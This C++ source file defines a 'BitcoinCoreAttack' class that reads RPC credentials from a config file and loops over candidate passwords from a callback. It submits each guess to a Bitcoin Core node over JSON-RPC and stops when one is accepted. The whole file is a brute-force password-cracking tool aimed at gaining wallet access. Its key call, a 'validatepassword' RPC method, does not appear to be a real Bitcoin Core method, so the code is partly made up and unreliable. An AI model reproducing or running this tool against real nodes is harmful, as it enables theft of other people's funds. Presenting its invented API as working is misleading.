#include "bitcoin_core.h"
#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>
#include <json/json.h>

BitcoinCoreAttack::BitcoinCoreAttack(GPUManager* gpuManager, MLPredictor* mlPredictor, 
                                     RuleEngine* ruleEngine, Logger* logger, 
                                     ThreadingUtils* threadingUtils, DBManager* dbManager)
    : gpuManager(gpuManager), mlPredictor(mlPredictor), ruleEngine(ruleEngine), 
      logger(logger), threadingUtils(threadingUtils), dbManager(dbManager), curl(nullptr) {}

void BitcoinCoreAttack::loadConfiguration(const std::string& configPath) {
    logger->info("Loading configuration from " + configPath, {"BitcoinCoreAttack", "Configuration"});

    std::ifstream configFile(configPath);
    if (!configFile.is_open()) {
        logger->error("Failed to open configuration file: " + configPath, {"BitcoinCoreAttack", "Configuration"});
        return;
    }

    Json::Value config;
    configFile >> config;

    bitcoinCoreUrl = config.get("bitcoinCoreUrl", "http://127.0.0.1:8332").asString();
    rpcUser = config.get("rpcUser", "user").asString();
    rpcPassword = config.get("rpcPassword", "password").asString();

    logger->info("Configuration loaded successfully.", {"BitcoinCoreAttack", "Configuration"});
}

void BitcoinCoreAttack::connectToBitcoinCore() {
    logger->info("Connecting to Bitcoin Core...", {"BitcoinCoreAttack", "Connection"});
    curl = curl_easy_init();
    if (!curl) {
        logger->error("Failed to initialize CURL", {"BitcoinCoreAttack", "Connection"});
        throw std::runtime_error("CURL initialization failed");
    }
}

void BitcoinCoreAttack::disconnectFromBitcoinCore() {
    logger->info("Disconnecting from Bitcoin Core...", {"BitcoinCoreAttack", "Connection"});
    if (curl) {
        curl_easy_cleanup(curl);
        curl = nullptr;
    }
}

bool BitcoinCoreAttack::sendRpcRequest(const std::string& method, const Json::Value& params, Json::Value& result) {
    if (!curl) {
        logger->error("No active CURL session", {"BitcoinCoreAttack", "RPCRequest"});
        return false;
    }

    Json::Value rpcRequest;
    rpcRequest["jsonrpc"] = "1.0";
    rpcRequest["id"] = "curltest";
    rpcRequest["method"] = method;
    rpcRequest["params"] = params;

    std::string requestData = rpcRequest.toStyledString();
    std::string responseString;
    
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, bitcoinCoreUrl.c_str());
    curl_easy_setopt(curl, CURLOPT_USERPWD, (rpcUser + ":" + rpcPassword).c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestData.c_str());

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char* buffer, size_t size, size_t nmemb, std::string* out) {
        out->append(buffer, size * nmemb);
        return size * nmemb;
    });
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseString);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        logger->error("CURL error: " + std::string(curl_easy_strerror(res)), {"BitcoinCoreAttack", "RPCRequest"});
        return false;
    }

    Json::CharReaderBuilder reader;
    std::string errs;
    if (!Json::parseFromStream(reader, responseString, &result, &errs)) {
        logger->error("Failed to parse JSON response: " + errs, {"BitcoinCoreAttack", "RPCRequest"});
        return false;
    }

    return true;
}

bool BitcoinCoreAttack::checkPasswordInBitcoinCore(const std::string& password) {
    logger->info("Checking password: " + password, {"BitcoinCoreAttack", "PasswordCheck"});

    Json::Value params(Json::arrayValue);
    params.append(password);

    Json::Value result;
    if (!sendRpcRequest("validatepassword", params, result)) {
        logger->error("Failed to send RPC request", {"BitcoinCoreAttack", "PasswordCheck"});
        return false;
    }
    if (result.isMember("result") && result["result"].asBool()) {
        logger->info("Password is valid: " + password, {"BitcoinCoreAttack", "PasswordCheck"});
        return true;
    } else {
        logger->info("Password is invalid: " + password, {"BitcoinCoreAttack", "PasswordCheck"});
        return false;
    }
}

void BitcoinCoreAttack::setAttackCallback(std::function<std::string()> attackCallback) {
    this->attackCallback = attackCallback;
}

void BitcoinCoreAttack::execute() {
    logger->info("Starting Bitcoin Core attack.", {"BitcoinCoreAttack", "Execution"});

    connectToBitcoinCore();

    while (!stopFlag) {
        if (attackCallback) {
            std::string password = attackCallback();
            if (password.empty()) {
                logger->info("No more passwords to check. Stopping attack.", {"BitcoinCoreAttack", "Execution"});
                break;
            }

            if (checkPasswordInBitcoinCore(password)) {
                logger->info("Successful password found: " + password, {"BitcoinCoreAttack", "Execution"});
                break;
            }
        } else {
            logger->error("Attack callback is not set!", {"BitcoinCoreAttack", "Execution"});
            break;
        }
    }

    disconnectFromBitcoinCore();

    logger->info("Bitcoin Core attack completed.", {"BitcoinCoreAttack", "Execution"});
}

